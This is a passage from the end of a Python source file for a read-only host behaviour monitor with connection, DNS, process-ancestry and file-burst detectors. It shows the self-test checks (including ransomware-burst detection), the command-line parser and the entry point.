        f = analyse_files(diff, summary, d, 20.0)
        check("encryption suffixes are reported CRITICAL",
              any(x["severity"] == "critical" and "encryption" in x["title"] for x in f),
              [x["title"] for x in f])
        check("the ransom note is reported CRITICAL",
              any(x["severity"] == "critical" and "ransom note" in x["title"] for x in f))
        check("the advice says to disconnect first",
              any("Disconnect the machine" in x.get("advice", "") for x in f))
        check("the breakdown by extension is offered",
              any("top extensions" in x.get("evidence", "") for x in f))
        check("the report still says a build looks the same",
              any("compile" in x.get("advice", "") for x in f))
        buildish = os.path.join(tmp, "build")
        os.makedirs(os.path.join(buildish, "out"))
        b1 = scan_tree(buildish)
        for i in range(40):
            with open(os.path.join(buildish, "out", f"obj{i}.o"), "w") as fh:
                fh.write("x")
        b2 = scan_tree(buildish)
        bdiff = diff_trees(b1.data, b2.data, 2.0)
        bsum = summarise_changes(bdiff)
        check("a build writing into one directory has a low spread",
              bsum["spread"] < 0.1, bsum["spread"])
        bf = analyse_files(bdiff, bsum, buildish, 20.0)
        check("and is not reported as spread across many directories",
              not any("spread thinly" in x["title"] for x in bf),
              [x["title"] for x in bf])
        check("common build directories are skipped by default",
              "node_modules" in SKIP_DIRS and ".git" in SKIP_DIRS)

        print("\n Running all four together")
        res = run_check(detectors=list(DETECTORS), watch_root=d, window=0.5)
        check("a combined check completes", res["id"] > 0)
        check("all four detectors are recorded",
              set(res["detectors"]) == set(DETECTORS))
        check("every finding names its detector",
              all(f["detector"] in DETECTORS for f in res["findings"]))
        check("every finding carries advice",
              all(f.get("advice") for f in res["findings"]),
              [f["title"] for f in res["findings"] if not f.get("advice")])
        res2 = run_check(detectors=["connections"], window=0.5)
        check("selecting one detector runs only that one",
              res2["detectors"] == ["connections"])
        check("and the others are absent from the findings",
              all(f["detector"] == "connections" for f in res2["findings"]))
        res3 = run_check(detectors=["files"], window=0.5)
        check("the file detector without a directory says so",
              any("No directory was given" in f["title"] for f in res3["findings"]),
              [f["title"] for f in res3["findings"]])

        print("\n Persistence")
        s = scan_summary(res["id"])
        check("a check is stored", s and s["id"] == res["id"])
        check("findings are stored",
              q1("SELECT COUNT(*) c FROM findings WHERE scan_id=?",
                 (res["id"],))["c"] == len(res["findings"]))
        check("the baseline remembers connections",
              q1("SELECT COUNT(*) c FROM known WHERE kind='connection'", ())["c"] >= 0)
        remember("connection", "test|1.2.3.4|443|tcp", "test")
        remember("connection", "test|1.2.3.4|443|tcp", "test")
        row = q1("SELECT * FROM known WHERE key=?", ("test|1.2.3.4|443|tcp",))
        check("seeing something twice increments rather than duplicating",
              row["times_seen"] == 2, row["times_seen"])
        ok, key = approve("connection", "test|1.2.3.4|443|tcp", "mine")
        check("something can be approved", ok and known_map("connection")[key]["approved"])
        check("approving something unseen is refused with a reason",
              not approve("connection", "never-seen-at-all")[0])
        check("approval can be revoked",
              revoke("connection", "test|1.2.3.4|443|tcp") == 1
              and not known_map("connection")["test|1.2.3.4|443|tcp"]["approved"])

        print("\n Charts")
        cbd = counts_by_detector(res["id"])
        lanes = svg_detectors(cbd, {"connections": {"status": "ok"},
                                    "dns": {"status": "unavailable",
                                            "detail": "needs root"}})
        check("a lane is drawn per detector", lanes.count("<rect") >= len(DETECTORS))
        check("a detector that did not run is visibly different",
              "DID NOT RUN" in lanes,
              "this must not look the same as running and finding nothing")
        check("a detector that ran clean says so", "found nothing" in lanes)
        tree = svg_tree(analyse_ancestry(attack))
        check("the ancestry chart draws the chain", tree.count("<rect") > 2)
        check("the ancestry chart with nothing to show says so",
              "no unusual parent-child" in svg_tree([]))
        check("pie renders slices",
              svg_pie([("a", 2, "#fff"), ("b", 1, "#000")]).count("<path") == 2)
        check("history needs two points and says so",
              "needs at least two" in svg_history([{"score": 1}]))
        check("charts guard against empty input",
              all("nothing to show" in x or "needs at least" in x or "no unusual" in x
                  for x in (svg_pie([]), svg_bar([]), svg_tree([]), svg_history([]))))

        print("\n Exports")
        j = json.loads(export_json(res["id"]))
        check("JSON export carries the disclaimer",
              "HEURISTIC" in j["disclaimer"].upper())
        check("JSON export says these are heuristics not verdicts",
              "not a verdict" in j["heuristics_not_verdicts"])
        check("JSON export names the DoH blind spot",
              "INVISIBLE" in j["doh_blind_spot"].upper())
        check("JSON export names the polling limit",
              "between two polls" in j["polling_limit"])
        check("JSON export lists the limitations", len(j["limitations"]) >= 7)
        check("JSON export says the first run becomes the baseline",
              any("first run" in x.lower() for x in j["limitations"]))
        c_ = export_csv(res["id"])
        check("CSV export has sections", c_.count("##") >= 3)
        check("CSV says none of it is a verdict",
              any("not a verdict" in l.lower() for l in c_.splitlines()[:6]))
        h = export_html(res["id"])
        check("HTML export is a complete document",
              h.startswith("<!doctype html") and h.rstrip().endswith("</html>"))
        check("HTML export contains charts and the author", "<svg" in h and AUTHOR in h)

        print("\n Web application")
        if not HAVE_FLASK:
            check("Flask installed", False, "pip install flask")
        else:
            app = build_app()
            app.config["TESTING"] = True
            cl = app.test_client()
            for path, must in (("/", "Overview"), ("/baseline", "Baseline"),
                               ("/scans", "Checks"), ("/learn", "inherently bad"),
                               ("/logs", "Logs")):
                r_ = cl.get(path)
                body = r_.get_data(as_text=True)
                check(f"page {path} renders",
                      r_.status_code == 200 and must.lower() in body.lower(),
                      r_.status_code)
            check("every page says these are heuristics not verdicts",
                  "not a verdict" in cl.get("/").get_data(as_text=True))
            check("the learn page explains all four detectors",
                  all(w in cl.get("/learn").get_data(as_text=True).lower()
                      for w in ("connections", "dns", "parent-child", "modification")))
            check("the learn page warns about the baseline problem",
                  "first run makes everything normal"
                  in cl.get("/learn").get_data(as_text=True).lower())
            check("the baseline page warns it inherits a compromise",
                  "already wrong" in cl.get("/baseline").get_data(as_text=True))
            r_ = cl.post("/check", data={"detector": ["connections"]})
            check("running a check from the web works", r_.status_code == 302)
            r_ = cl.post("/check", data={"detector": ["files"],
                                         "watch_root": "/does/not/exist"})
            check("a bad directory is rejected with a message",
                  r_.status_code == 302 and "error" in r_.headers["Location"])
            check("findings can be filtered by detector",
                  cl.get(f"/?scan={res['id']}&detector=files").status_code == 200)
            for fmt, ctype in (("json", "application/json"), ("csv", "text/csv"),
                               ("html", "text/html")):
                r_ = cl.get(f"/export/{fmt}?scan={res['id']}")
                check(f"export /{fmt} downloads",
                      r_.status_code == 200 and ctype in r_.headers["Content-Type"]
                      and "attachment" in r_.headers.get("Content-Disposition", ""))
            check("bad export format is rejected", cl.get("/export/exe").status_code == 400)
            check("unknown route returns a helpful 404", cl.get("/nope").status_code == 404)
            api = cl.get("/api/summary").get_json()
            check("the api declares it is read-only", api["read_only"] is True)
            check("the api declares DoH is invisible", api["doh_is_invisible"] is True)
            check("the api declares it polls", api["polls_so_misses_short_lived"] is True)

        print("\n It changes nothing")
        mod = sys.modules[__name__]
        dangerous = [n for n in dir(mod)
                     if n.startswith(("kill_", "block_", "quarantine_", "delete_",
                                      "terminate_"))]
        check("no function exists to kill, block or quarantine anything",
              not dangerous, dangerous)
        probe = os.path.join(tmp, "untouched.txt")
        with open(probe, "w") as fh:
            fh.write("do not change me")
        digest = hashlib.sha256(open(probe, "rb").read()).hexdigest()
        mtime = os.path.getmtime(probe)
        run_check(detectors=["files"], watch_root=tmp, window=0.5)
        check("a watched file is not modified by watching it",
              hashlib.sha256(open(probe, "rb").read()).hexdigest() == digest)
        check("and its modification time is unchanged",
              os.path.getmtime(probe) == mtime)

        print("\n Retention")
        cmd_purge(argparse.Namespace(all=False, keep=1, baseline=False))
        check("purge keeps exactly the newest check",
              q1("SELECT COUNT(*) c FROM scans", ())["c"] == 1)
        check("purge removes orphaned findings",
              q1("SELECT COUNT(*) c FROM findings WHERE scan_id NOT IN "
                 "(SELECT id FROM scans)", ())["c"] == 0)
        cmd_purge(argparse.Namespace(all=True, keep=1, baseline=False))
        check("purge --all clears the checks",
              q1("SELECT COUNT(*) c FROM scans", ())["c"] == 0)
        check("the baseline survives by default",
              q1("SELECT COUNT(*) c FROM known", ())["c"] > 0)
        cmd_purge(argparse.Namespace(all=True, keep=1, baseline=True))
        check("purge --all --baseline clears it too",
              q1("SELECT COUNT(*) c FROM known", ())["c"] == 0)
    finally:
        set_db_path(original)
        shutil.rmtree(tmp, ignore_errors=True)

    line("=")
    print(f"  {len(passed)} passed, {len(failed)} failed"
          + (f", {len(skipped)} skipped" if skipped else ""))
    if failed:
        print("  Failed: " + ", ".join(failed))
    if skipped:
        print("  Skipped: " + ", ".join(skipped))
    if not failed:
        print("  All checks passed. Nothing on this machine was modified and the\n"
              "  temporary database has been removed.")
    line("=")
    return 0 if not failed else 1


# =============================================================================
# SECTION 13 - Entry point
# =============================================================================

def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(
        prog=os.path.basename(__file__),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        description=f"{APP_NAME} v{VERSION} - four host behaviour detectors in one, "
                    f"by {AUTHOR}",
        epilog=textwrap.dedent(f"""\
            the four detectors
              connections   outbound connections this program has not made before
              dns           which resolvers are queried, and (with root) what names
              processes     parent-child pairs that should not happen
              files         bursts of modification across a directory tree

            examples
              %(prog)s learn                     what each detector misses
              %(prog)s check
              %(prog)s check --watch-root ~/Documents --window 10
              %(prog)s check --only processes
              %(prog)s check --capture-seconds 30      (needs root)
              %(prog)s watch --interval 60 --watch-root ~/Documents
              %(prog)s check --fail-on-critical
              %(prog)s serve                     http://127.0.0.1:5000

            {DISCLAIMER_LONG}
            """))
    p.add_argument("--db", default=DEFAULT_DB,
                   help=f"SQLite database file (default: {DEFAULT_DB})")
    p.add_argument("--version", action="version", version=f"{APP_NAME} {VERSION}")
    sub = p.add_subparsers(dest="cmd")

    def detector_args(s):
        s.add_argument("--only", choices=DETECTORS, help="run just one detector")
        for d in DETECTORS:
            s.add_argument(f"--no-{d}", action="store_true", help=f"skip the {d} detector")
        s.add_argument("--watch-root", help="directory for the file detector")
        s.add_argument("--window", type=float, default=5.0,
                       help="seconds between the two file snapshots")
        s.add_argument("--capture-seconds", type=float, default=0.0,
                       help="sniff DNS for this long (needs root)")
        s.add_argument("--max-files", type=int, default=200_000)
        s.add_argument("--file-threshold", type=float, default=20.0,
                       help="files per second considered a burst")
        return s

    s = detector_args(sub.add_parser("check", help="run the detectors once"))
    s.add_argument("--quiet", action="store_true", help="hide informational findings")
    s.add_argument("--show", type=int, help="limit how many findings are printed")
    s.add_argument("--fail-on-critical", action="store_true",
                   help="exit non-zero on any critical finding")
    s.add_argument("--fail-over", type=float,
                   help="exit non-zero if the score exceeds this")
    s.add_argument("--note")
    s.set_defaults(func=cmd_check)

    s = detector_args(sub.add_parser("watch", help="run repeatedly, report only findings"))
    s.add_argument("--interval", type=float, default=60.0)
    s.add_argument("--count", type=int)
    s.add_argument("--quiet", action="store_true")
    s.set_defaults(func=cmd_watch)

    s = sub.add_parser("baseline", help="everything seen before")
    s.add_argument("--kind", choices=["connection", "dnsname", "ancestry"])
    s.add_argument("--limit", type=int, default=60)
    s.set_defaults(func=cmd_baseline)

    s = sub.add_parser("approve", help="stop something being reported as unusual")
    s.add_argument("kind", choices=["connection", "dnsname", "ancestry"])
    s.add_argument("key")
    s.add_argument("--label")
    s.set_defaults(func=cmd_approve)

    s = sub.add_parser("revoke", help="undo an approval")
    s.add_argument("kind", choices=["connection", "dnsname", "ancestry"])
    s.add_argument("key")
    s.set_defaults(func=cmd_revoke)

    s = sub.add_parser("learn", help="the four detectors, and what each one misses")
    s.set_defaults(func=cmd_learn)

    s = sub.add_parser("scans", help="previous checks")
    s.add_argument("--limit", type=int, default=25)
    s.set_defaults(func=cmd_scans)

    s = sub.add_parser("serve", help="start the web app")
    s.add_argument("--host", default="127.0.0.1")
    s.add_argument("--port", type=int, default=5000)
    s.add_argument("--debug", action="store_true")
    s.set_defaults(func=cmd_serve)

    s = sub.add_parser("export", help="write a report to a file")
    s.add_argument("--scan", type=int)
    s.add_argument("--format", choices=["json", "csv", "html"], default="html")
    s.add_argument("--out")
    s.set_defaults(func=cmd_export)

    s = sub.add_parser("logs", help="local event log")
    s.add_argument("--level", choices=["INFO", "WARN", "ERROR", "info", "warn", "error"])
    s.add_argument("--limit", type=int, default=50)
    s.set_defaults(func=cmd_logs)

    s = sub.add_parser("purge", help="delete stored checks")
    s.add_argument("--keep", type=int, default=50)
    s.add_argument("--all", action="store_true")
    s.add_argument("--baseline", action="store_true",
                   help="with --all, also clear what has been seen before")
    s.set_defaults(func=cmd_purge)

    s = sub.add_parser("selftest", help="verify every component (temporary database)")
    s.set_defaults(func=cmd_selftest)

    s = sub.add_parser("version", help="versions, capabilities and the disclaimer")
    s.set_defaults(func=cmd_version)
    return p


def main(argv=None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)
    set_db_path(args.db)
    if not getattr(args, "cmd", None):
        parser.print_help()
        return 0
    if args.cmd != "selftest":
        init_db()
    try:
        rc = args.func(args)
        return rc if isinstance(rc, int) else 0
    except BrokenPipeError:
        try:
            os.dup2(os.open(os.devnull, os.O_WRONLY), sys.stdout.fileno())
        except Exception:
            pass
        return 0
    except KeyboardInterrupt:
        print("\nInterrupted.")
        return 130
    except sqlite3.OperationalError as e:
        print(f"Database error: {e}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
